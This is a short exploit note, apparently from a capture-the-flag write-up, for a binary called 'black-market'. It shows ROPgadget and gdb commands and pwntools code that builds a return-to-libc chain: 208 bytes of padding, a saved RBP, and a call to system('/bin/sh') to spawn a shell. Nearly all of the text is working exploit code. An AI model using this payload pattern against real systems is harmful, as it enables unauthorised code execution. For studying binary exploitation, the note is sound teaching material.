### Ret2libc

---

```py
ROPgadget --binary ./black-market
gdb> got
```

```py
rop = ROP(libc) #libc address
rop.system(next(libc.search(b'/bin/sh\x00')))
pld = flat(
b'A'*208,
p64(0), # saved RBP
rop.chain()
)
```

